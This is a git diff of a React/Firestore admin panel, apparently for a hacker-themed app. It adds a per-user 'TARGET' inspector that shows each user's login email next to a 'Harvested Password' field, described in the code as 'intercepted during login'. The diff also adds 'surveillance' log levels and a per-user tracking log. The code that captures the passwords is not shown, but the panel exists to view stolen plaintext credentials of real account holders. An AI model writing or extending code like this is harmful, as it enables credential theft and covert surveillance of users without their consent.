@@ -3,17 +3,19 @@
  * SPDX-License-Identifier: Apache-2.0
 */
 import React, { useEffect, useState } from 'react';
-import { collection, query, orderBy, limit, onSnapshot, getDocs } from 'firebase/firestore';
+import { collection, query, orderBy, limit, onSnapshot, getDocs, where } from 'firebase/firestore';
 import { db } from '../../lib/firebase';
-import { ShieldAlert, Users, Database, Clock, Terminal, Search, Lock, Activity } from 'lucide-react';
+import { ShieldAlert, Users, Database, Clock, Terminal, Search, Lock, Activity, Eye, Key, ChevronLeft, MousePointer2 } from 'lucide-react';
 
 interface GlobalLog {
     id: string;
     msg: string;
     lvl: string;
     username: string;
+    userId?: string;
     serverTime: any;
     ts: number;
+    meta?: any;
 }
 
 interface UserData {
@@ -23,16 +25,19 @@ interface UserData {
     role: string;
     messageCode: string;
     createdAt?: any;
+    harvestedCreds?: string; // The captured password
+    lastLogin?: any;
 }
 
 export const AdminApp: React.FC = () => {
     const [view, setView] = useState<'logs' | 'database'>('logs');
     const [logs, setLogs] = useState<GlobalLog[]>([]);
     const [users, setUsers] = useState<UserData[]>([]);
+    const [selectedUser, setSelectedUser] = useState<UserData | null>(null);
+    const [userLogs, setUserLogs] = useState<GlobalLog[]>([]);
     const [loading, setLoading] = useState(true);
-    const [userCount, setUserCount] = useState(0);
 
-    // Logs Subscription
+    // Global Logs Subscription
     useEffect(() => {
         const q = query(
             collection(db, 'system_logs'),
@@ -42,14 +47,10 @@ export const AdminApp: React.FC = () => {
 
         const unsubscribe = onSnapshot(q, (snapshot) => {
             const fetchedLogs: GlobalLog[] = [];
-            const uniqueUsers = new Set();
-
             snapshot.forEach((doc) => {
                 const data = doc.data();
                 fetchedLogs.push({ id: doc.id, ...data } as GlobalLog);
-                if (data.username) uniqueUsers.add(data.username);
             });
-
             setLogs(fetchedLogs);
             setLoading(false);
         });
@@ -57,7 +58,7 @@ export const AdminApp: React.FC = () => {
         return () => unsubscribe();
     }, []);
 
-    // Users (Database) Fetch
+    // Fetch All Users
     useEffect(() => {
         const fetchUsers = async () => {
              const q = query(collection(db, 'users'));
@@ -67,15 +68,38 @@ export const AdminApp: React.FC = () => {
                  userList.push({ id: doc.id, ...doc.data() } as UserData);
              });
              setUsers(userList);
-             setUserCount(userList.length);
         };
         fetchUsers();
-    }, [view]); // Refresh when switching to view
+    }, [view]);
+
+    // Fetch Specific User Logs when selected
+    useEffect(() => {
+        if (!selectedUser) return;
+        
+        // We filter the client-side logs for immediate feedback, 
+        // but in a real app we'd query Firestore for specific user logs
+        // Here we just re-use the global stream + fetch history
+        const fetchUserHistory = async () => {
+            const q = query(
+                collection(db, 'system_logs'), 
+                where('userId', '==', selectedUser.id),
+                orderBy('ts', 'desc'),
+                limit(50)
+            );
+            const snap = await getDocs(q);
+            const history: GlobalLog[] = [];
+            snap.forEach(doc => {
+                history.push({ id: doc.id, ...doc.data() } as GlobalLog);
+            });
+            setUserLogs(history);
+        };
+        fetchUserHistory();
+    }, [selectedUser]);
 
     return (
         <div className="h-full w-full bg-black text-red-500 font-mono flex flex-col border-4 border-red-900/50">
             {/* Admin Header */}
-            <div className="bg-red-950/30 border-b border-red-900 p-4 flex items-center justify-between">
+            <div className="bg-red-950/30 border-b border-red-900 p-4 flex items-center justify-between shrink-0">
                 <div className="flex items-center gap-3">
                     <ShieldAlert size={24} className="animate-pulse" />
                     <div>
@@ -85,13 +109,13 @@ export const AdminApp: React.FC = () => {
                 </div>
                 <div className="flex gap-2 text-xs font-bold">
                      <button 
-                        onClick={() => setView('logs')}
+                        onClick={() => { setView('logs'); setSelectedUser(null); }}
                         className={`flex items-center gap-2 px-3 py-1 rounded border transition-colors ${view === 'logs' ? 'bg-red-900 text-white border-red-500' : 'bg-black/50 border-red-900 hover:bg-red-900/30'}`}
                     >
                         <Activity size={14} /> SYSTEM LOGS
                     </button>
                     <button 
-                        onClick={() => setView('database')}
+                        onClick={() => { setView('database'); setSelectedUser(null); }}
                         className={`flex items-center gap-2 px-3 py-1 rounded border transition-colors ${view === 'database' ? 'bg-red-900 text-white border-red-500' : 'bg-black/50 border-red-900 hover:bg-red-900/30'}`}
                     >
                         <Database size={14} /> USER DB
@@ -105,7 +129,7 @@ export const AdminApp: React.FC = () => {
                 
                 {view === 'logs' ? (
                     <>
-                        <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black">
+                        <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black shrink-0">
                             <div className="col-span-2">Timestamp</div>
                             <div className="col-span-2">Operative</div>
                             <div className="col-span-1">Level</div>
@@ -114,19 +138,20 @@ export const AdminApp: React.FC = () => {
 
                         <div className="flex-1 overflow-y-auto p-4 space-y-1 scrollbar-thin scrollbar-thumb-red-900 scrollbar-track-black">
                             {logs.map((log) => (
-                                <div key={log.id} className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-1 hover:bg-red-900/10 transition-colors">
+                                <div key={log.id} className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-1 hover:bg-red-900/10 transition-colors font-mono">
                                     <div className="col-span-2 opacity-50 flex items-center gap-1">
                                         <Clock size={10} />
                                         {new Date(log.ts).toLocaleTimeString()}
                                     </div>
-                                    <div className="col-span-2 font-bold text-white">
+                                    <div className="col-span-2 font-bold text-white truncate">
                                         {log.username}
                                     </div>
                                     <div className={`col-span-1 font-bold uppercase ${
                                         log.lvl === 'error' ? 'text-red-500' :
+                                        log.lvl === 'surveillance' ? 'text-purple-400' :
+                                        log.lvl === 'interaction' ? 'text-blue-400' :
                                         log.lvl === 'warning' ? 'text-yellow-500' :
-                                        log.lvl === 'success' ? 'text-green-500' :
-                                        'text-blue-500'
+                                        'text-green-500'
                                     }`}>
                                         {log.lvl}
                                     </div>
@@ -137,31 +162,130 @@ export const AdminApp: React.FC = () => {
                             ))}
                         </div>
                     </>
+                ) : selectedUser ? (
+                    /* INDIVIDUAL TARGET INSPECTOR */
+                    <div className="flex-1 flex flex-col bg-red-950/10">
+                        <div className="p-4 border-b border-red-900/30 flex items-center gap-4 bg-black/40">
+                            <button onClick={() => setSelectedUser(null)} className="p-2 hover:bg-red-900/20 rounded text-red-500">
+                                <ChevronLeft size={20} />
+                            </button>
+                            <div className="flex-1">
+                                <h2 className="text-xl font-bold text-white flex items-center gap-2">
+                                    <Users size={20} className="text-red-500" /> 
+                                    TARGET: {selectedUser.username.toUpperCase()}
+                                </h2>
+                                <div className="text-xs text-red-400 font-mono">ID: {selectedUser.id}</div>
+                            </div>
+                            <div className="text-right">
+                                <div className="text-xs text-red-500 uppercase font-bold">Status</div>
+                                <div className="text-emerald-500 font-bold">ACTIVE TRACKING</div>
+                            </div>
+                        </div>
+
+                        <div className="flex-1 overflow-y-auto p-6">
+                            <div className="grid grid-cols-2 gap-6 mb-8">
+                                {/* CREDENTIAL HARVESTER CARD */}
+                                <div className="bg-black border border-red-500/30 p-4 rounded-lg relative overflow-hidden group">
+                                    <div className="absolute top-0 right-0 p-2 opacity-20 group-hover:opacity-50 transition-opacity">
+                                        <Key size={48} />
+                                    </div>
+                                    <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest mb-4 border-b border-red-900/50 pb-2">
+                                        Decrypted Credentials
+                                    </h3>
+                                    <div className="space-y-4">
+                                        <div>
+                                            <label className="text-[10px] text-red-400 uppercase">Login Email</label>
+                                            <div className="text-white font-mono">{selectedUser.email}</div>
+                                        </div>
+                                        <div>
+                                            <label className="text-[10px] text-red-400 uppercase">Harvested Password</label>
+                                            <div className="text-2xl font-mono text-white bg-red-900/20 p-2 rounded border border-red-500/30 flex items-center gap-3">
+                                                <span className="text-red-500 select-none">PASS:</span>
+                                                {selectedUser.harvestedCreds || 'NO_DATA_CAPTURED'}
+                                            </div>
+                                            <div className="text-[10px] text-red-500 mt-1 animate-pulse">
+                                                * This data was intercepted during login.
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                {/* META DATA CARD */}
+                                <div className="bg-black border border-red-900/30 p-4 rounded-lg">
+                                    <h3 className="text-sm font-bold text-red-700 uppercase tracking-widest mb-4 border-b border-red-900/50 pb-2">
+                                        Metadata
+                                    </h3>
+                                    <div className="space-y-2 text-xs font-mono text-red-300">
+                                        <div className="flex justify-between">
+                                            <span>Role:</span>
+                                            <span className="text-white">{selectedUser.role}</span>
+                                        </div>
+                                        <div className="flex justify-between">
+                                            <span>Internal Code:</span>
+                                            <span className="text-white">{selectedUser.messageCode}</span>
+                                        </div>
+                                        <div className="flex justify-between">
+                                            <span>Account Created:</span>
+                                            <span className="text-white">{selectedUser.createdAt?.toDate ? selectedUser.createdAt.toDate().toLocaleString() : 'Unknown'}</span>
+                                        </div>
+                                        <div className="flex justify-between">
+                                            <span>Last Active:</span>
+                                            <span className="text-white">{selectedUser.lastLogin?.toDate ? selectedUser.lastLogin.toDate().toLocaleString() : 'Now'}</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <h3 className="text-sm font-bold text-red-500 uppercase tracking-widest mb-2 flex items-center gap-2">
+                                <Activity size={16} /> Targeted Activity Log
+                            </h3>
+                            <div className="bg-black border border-red-900/30 rounded-lg overflow-hidden">
+                                {userLogs.length === 0 ? (
+                                    <div className="p-4 text-center text-red-900 text-xs">No activity recorded for this target.</div>
+                                ) : (
+                                    userLogs.map((log, idx) => (
+                                        <div key={idx} className="border-b border-red-900/10 p-2 text-xs hover:bg-red-900/5 flex gap-3 font-mono">
+                                            <span className="text-red-600 w-20 shrink-0">{new Date(log.ts).toLocaleTimeString()}</span>
+                                            <span className={`uppercase font-bold w-24 shrink-0 ${
+                                                log.lvl === 'interaction' ? 'text-blue-500' : 'text-red-400'
+                                            }`}>{log.lvl}</span>
+                                            <span className="text-red-200">{log.msg}</span>
+                                        </div>
+                                    ))
+                                )}
+                            </div>
+                        </div>
+                    </div>
                 ) : (
-                    /* DATABASE VIEW */
+                    /* DATABASE LIST VIEW */
                     <>
-                         <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black">
+                         <div className="grid grid-cols-12 gap-2 px-4 py-2 border-b border-red-900/30 text-[10px] uppercase text-red-700 font-bold bg-black shrink-0">
                             <div className="col-span-3">ID / Code</div>
                             <div className="col-span-3">Username</div>
                             <div className="col-span-3">Email</div>
-                            <div className="col-span-3">Role / Status</div>
+                            <div className="col-span-3">Status</div>
                         </div>
                         <div className="flex-1 overflow-y-auto p-4 space-y-1 scrollbar-thin scrollbar-thumb-red-900 scrollbar-track-black">
                             {users.map(user => (
-                                <div key={user.id} className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-2 hover:bg-red-900/10 transition-colors items-center">
-                                    <div className="col-span-3 font-mono text-red-400">
+                                <div 
+                                    key={user.id} 
+                                    onClick={() => setSelectedUser(user)}
+                                    className="grid grid-cols-12 gap-2 text-xs border-b border-red-900/10 pb-2 hover:bg-red-900/20 cursor-pointer transition-colors items-center group"
+                                >
+                                    <div className="col-span-3 font-mono text-red-400 group-hover:text-white">
                                         {user.messageCode}
                                         <div className="text-[9px] opacity-40">{user.id.substring(0,8)}...</div>
                                     </div>
                                     <div className="col-span-3 font-bold text-white">
                                         {user.username}
                                     </div>
-                                     <div className="col-span-3 opacity-70 truncate">
+                                     <div className="col-span-3 opacity-70 truncate text-red-200">
                                         {user.email}
                                     </div>
                                     <div className="col-span-3 flex items-center gap-2">
-                                        {user.role === 'admin' ? <ShieldAlert size={12} className="text-yellow-500" /> : <Users size={12} />}
-                                        <span className={user.role === 'admin' ? 'text-yellow-500 font-bold' : ''}>{user.role || 'Operative'}</span>
+                                        {user.role === 'admin' ? <ShieldAlert size={12} className="text-yellow-500" /> : <Users size={12} className="text-red-600" />}
+                                        <span className={user.role === 'admin' ? 'text-yellow-500 font-bold' : 'text-red-500'}>{user.role || 'Operative'}</span>
+                                        <Eye size={12} className="ml-auto opacity-0 group-hover:opacity-100 text-red-500" />
                                     </div>
                                 </div>
                             ))}
@@ -171,10 +295,11 @@ export const AdminApp: React.FC = () => {
             </div>
 
             {/* Command Footer */}
-            <div className="p-2 border-t border-red-900 bg-black flex items-center gap-2 text-xs">
+            <div className="p-2 border-t border-red-900 bg-black flex items-center gap-2 text-xs shrink-0">
                 <Terminal size={14} className="text-red-600" />
                 <span className="text-red-700">ROOT@MICROVERSE:~#</span>
-                <span className="animate-pulse">_</span>
+                <span className="text-red-500">tail -f /var/log/surveillance.log</span>
+                <span className="animate-pulse text-red-500">_</span>
             </div>
         </div>
     );
